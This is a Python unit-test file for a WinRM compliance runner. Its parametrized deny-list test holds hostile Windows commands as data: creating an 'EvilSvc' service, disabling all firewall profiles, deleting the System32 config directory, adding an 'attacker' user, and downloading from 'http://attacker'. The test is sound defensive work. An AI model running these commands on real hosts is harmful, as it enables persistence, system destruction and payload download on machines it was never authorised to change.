"""Unit tests for the Windows WinRM runner.

We mock `winrm.Session` so these tests run on Linux CI without needing a
real Windows host. Coverage targets:

- The read-only safety filter rejects every write/mutating verb family.
- Each `expect.kind` evaluates correctly against representative output
  shapes (PowerShell Format-List, secedit INI, plain regex, etc.).
- Missing credentials / shell mis-spellings produce a structured
  ``error`` result rather than crashing.
"""
from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from grc.modules.compliance_plugins.runners import winrm_runner
from grc.modules.compliance_plugins.runners.registry import RUNNERS


CREDS = {
    "winrm_endpoint": "https://10.0.0.5:5986/wsman",
    "winrm_username": "scan_svc",
    "winrm_password": "secret",
    "winrm_transport": "ntlm",
    "winrm_server_cert_validation": "validate",
    "winrm_ca_trust_path": None,
}


def _mock_session(stdout: str = "", stderr: str = "", status_code: int = 0):
    """Build a mock winrm.Session whose run_ps/run_cmd return canned output."""
    session = MagicMock()
    response = MagicMock()
    response.std_out = stdout.encode("utf-8")
    response.std_err = stderr.encode("utf-8")
    response.status_code = status_code
    session.run_ps.return_value = response
    session.run_cmd.return_value = response
    return session


def test_runner_is_registered():
    """The module's import side-effect must register the runner."""
    assert "windows_winrm" in RUNNERS


def test_missing_creds_returns_error():
    res = winrm_runner.windows_winrm_runner(
        {"command": "Get-LocalUser"},
        {},
    )
    assert res.status == "error"
    assert "credentials missing" in res.summary.lower()


def test_missing_command_returns_error():
    res = winrm_runner.windows_winrm_runner({}, CREDS)
    assert res.status == "error"
    assert "command" in res.summary.lower()


@pytest.mark.parametrize(
    "bad_cmd",
    [
        "Set-LocalUser -Name foo -Password bar",      # Set-* verb
        "Remove-Item C:\\foo",                          # Remove-* verb
        "Stop-Service Spooler",                         # Stop-* verb
        "Restart-Computer -Force",                      # Restart-*
        "New-LocalUser -Name attacker",                 # New-*
        "Disable-WindowsOptionalFeature -Online",       # Disable-*
        "reg add HKLM\\Foo /v Bar /d 1",                # reg add
        "sc create EvilSvc binpath= c:\\evil.exe",      # sc create
        "netsh advfirewall set allprofiles state off",  # netsh set
        "del C:\\Windows\\System32\\config",            # cmd del
        "Get-Process | Out-File C:\\report.txt",        # Out-File
        "Invoke-WebRequest -Uri http://x -OutFile y",   # Invoke-* (blocked)
        # Bypass attempts the architect flagged
        "rm C:\\foo",                                   # rm alias for Remove-Item
        "ni C:\\x -ItemType File",                      # ni alias for New-Item
        "reg.exe add HKLM\\Foo /v Bar /d 1",            # .exe variant
        "sc.exe create EvilSvc binpath= c:\\evil.exe",  # .exe variant
        "net.exe user bob /add",                        # net.exe + flag
        "net user bob /active:no",                      # net user + flag
        "net user bob /passwordreq:no",                 # net user + flag
        "Get-Process 1>$env:TEMP\\out.txt",             # env-var redirect
        "Get-Process > C:\\out.txt",                    # plain redirect
        "Get-Process >> \\\\share\\out.txt",            # UNC append
        "cmd /c del C:\\foo",                           # cmd shell-out
        "powershell -Command Remove-Item C:\\x",        # PS shell-out
        "iwr http://attacker -OutFile C:\\x",           # iwr alias
        "Start-Process notepad.exe",                    # Start-Process
    ],
)
def test_safety_filter_rejects_writes(bad_cmd):
    res = winrm_runner.windows_winrm_runner(
        {"command": bad_cmd, "expect": {"kind": "exit_zero"}},
        CREDS,
    )
    assert res.status == "error"
    assert "safety filter" in res.summary.lower() or "rejected" in res.summary.lower()


@pytest.mark.parametrize(
    "good_cmd",
    [
        "Get-LocalUser",
        "Get-LocalGroupMember -Group Administrators",
        "Get-MpPreference | Format-List",
        "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies'",
        "auditpol /get /category:*",
        "net accounts",
        # Output-redirection to $null is a benign no-op idiom and must pass.
        "Get-LocalUser 2>$null",
    ],
)
def test_safety_filter_allows_reads(good_cmd):
    """Read-only cmdlets reach the WinRM session and are not pre-blocked."""
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout="ok\n", status_code=0)
        res = winrm_runner.windows_winrm_runner(
            {"command": good_cmd, "expect": {"kind": "exit_zero"}},
            CREDS,
        )
    # If safety filter were tripped, status would be "error" with an
    # `unsafe_command` error_message. Anything else means the command
    # was dispatched.
    assert res.error_message != "unsafe_command", res.summary


def test_exit_zero_pass():
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout="hello", status_code=0)
        res = winrm_runner.windows_winrm_runner(
            {
                "command": "Get-LocalUser",
                "expect": {"kind": "exit_zero"},
                "pass_message": "ok",
            },
            CREDS,
        )
    assert res.status == "passed"
    assert res.raw_output["exit_status"] == 0


def test_exit_zero_fail():
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(status_code=1)
        res = winrm_runner.windows_winrm_runner(
            {"command": "Get-LocalUser", "expect": {"kind": "exit_zero"}},
            CREDS,
        )
    assert res.status == "failed"


def test_stdout_contains():
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout="WinRM is enabled\n")
        res = winrm_runner.windows_winrm_runner(
            {
                "command": "Test-WSMan",
                "expect": {"kind": "stdout_contains", "value": "enabled"},
            },
            CREDS,
        )
    assert res.status == "passed"


def test_stdout_regex_multiline():
    out = "Subcategory: Logon\nLogon,Success and Failure\n"
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout=out)
        res = winrm_runner.windows_winrm_runner(
            {
                "command": "auditpol /get /category:*",
                "expect": {
                    "kind": "stdout_regex",
                    "value": r"Logon,(Success and Failure)",
                },
            },
            CREDS,
        )
    assert res.status == "passed"


def test_line_kv_equals_powershell_format_list():
    """`Get-MpPreference | Format-List` style output."""
    out = (
        "DisableRealtimeMonitoring        : False\n"
        "DisableBehaviorMonitoring        : False\n"
        "PUAProtection                    : 1\n"
    )
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout=out)
        res = winrm_runner.windows_winrm_runner(
            {
                "command": "Get-MpPreference | Format-List",
                "expect": {
                    "kind": "line_kv_equals",
                    "field": "DisableRealtimeMonitoring",
                    "expected": "False",
                },
            },
            CREDS,
        )
    assert res.status == "passed", res.summary


def test_line_kv_equals_net_accounts():
    """`net accounts` style output (colon-separated, value right-aligned)."""
    out = (
        "Force user logoff how long after time expires?:       Never\n"
        "Minimum password age (days):                          1\n"
        "Maximum password age (days):                          60\n"
        "Minimum password length:                              14\n"
        "Length of password history maintained:                24\n"
        "The command completed successfully.\n"
    )
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout=out)
        res = winrm_runner.windows_winrm_runner(
            {
                "shell": "cmd",
                "command": "net accounts",
                "expect": {
                    "kind": "line_kv_equals",
                    "field": "Minimum password length",
                    "expected": "14",
                },
            },
            CREDS,
        )
    assert res.status == "passed", res.summary


def test_secedit_field_equals():
    """secedit /export INI output."""
    out = (
        "[Unicode]\n"
        "Unicode=yes\n"
        "[System Access]\n"
        "MinimumPasswordAge = 1\n"
        "MaximumPasswordAge = 60\n"
        "MinimumPasswordLength = 14\n"
        "PasswordComplexity = 1\n"
        "[Version]\n"
        "signature=\"$CHICAGO$\"\n"
    )
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout=out)
        res = winrm_runner.windows_winrm_runner(
            {
                "command": "Get-Content $env:TEMP\\secpol.inf",
                "expect": {
                    "kind": "secedit_field_equals",
                    "field": "MinimumPasswordLength",
                    "expected": "14",
                },
            },
            CREDS,
        )
    assert res.status == "passed", res.summary


def test_secedit_field_equals_fails_when_value_too_low():
    out = "[System Access]\nMinimumPasswordLength = 8\n"
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout=out)
        res = winrm_runner.windows_winrm_runner(
            {
                "command": "Get-Content $env:TEMP\\secpol.inf",
                "expect": {
                    "kind": "secedit_field_equals",
                    "field": "MinimumPasswordLength",
                    "expected": "14",
                },
            },
            CREDS,
        )
    assert res.status == "failed", res.summary


def test_invalid_shell_returns_error():
    res = winrm_runner.windows_winrm_runner(
        {"command": "ls", "shell": "bash", "expect": {"kind": "exit_zero"}},
        CREDS,
    )
    assert res.status == "error"
    assert "shell" in res.summary.lower()


def test_winrm_exception_returns_error():
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.side_effect = ConnectionRefusedError("nope")
        res = winrm_runner.windows_winrm_runner(
            {"command": "Get-LocalUser", "expect": {"kind": "exit_zero"}},
            CREDS,
        )
    assert res.status == "error"
    assert "WinRM execution failed" in res.summary


def test_stdout_truncation():
    """Outputs >8KB are stored truncated with a marker."""
    big = "X" * 20000
    with patch.object(winrm_runner, "winrm") as mock_winrm:
        mock_winrm.Session.return_value = _mock_session(stdout=big, status_code=0)
        res = winrm_runner.windows_winrm_runner(
            {"command": "Get-LocalUser", "expect": {"kind": "exit_zero"}},
            CREDS,
        )
    assert "[truncated, total 20000 bytes]" in res.raw_output["stdout"]
